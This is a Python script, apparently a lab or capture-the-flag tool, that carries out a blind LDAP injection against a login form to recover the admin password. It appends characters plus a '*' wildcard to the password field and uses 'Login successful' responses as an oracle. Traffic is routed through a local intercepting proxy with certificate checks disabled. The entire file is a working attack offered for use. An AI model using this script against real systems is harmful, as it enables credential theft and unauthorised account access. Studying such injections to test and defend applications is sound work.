import requests
import string
import argparse
import sys

def username(url):

    character_set = get_characters()
    password = ''
    proxies = { 'http' : "http://127.0.0.1:8080" }
    headers = {
    'Content-Type': 'application/x-www-form-urlencoded'
    }

    while True:
        found_character = False

        for char in character_set:
            test_password = password + char
            data = f"username=admin&password={test_password}*".encode('utf-8')
            
            response = requests.post(url, data=data, headers=headers, proxies=proxies,  verify=False)

            if "Login successful" in response.text:
                password += char
                sys.stdout.write(f"\rFound password so far: {password}\n")
                sys.stdout.flush()
                found_character = True
                break  # Move to the next character position

            elif "Login failed" in response.text:
                continue  # Try the next character

        if not found_character:
            # No more characters matched - username is complete
            print(f"\nFinal password: {password}")
            break


def get_characters():

    # Define the character sets
    lowercase = string.ascii_lowercase  # a-z
    uppercase = string.ascii_uppercase  # A-Z
    digits = string.digits              # 0-9
    punctuation = string.punctuation.replace('*','')

    return lowercase + uppercase + digits + punctuation

def main():
    # Initialize the argument parser
    parser = argparse.ArgumentParser(description="LDAP Injection")

    # Define command-line arguments
    parser.add_argument('-t', '--target', type=str, help='URL for the target', required=True)

    # Parse the arguments
    args = parser.parse_args()

    username(args.target)    

if __name__ == "__main__":
    main()
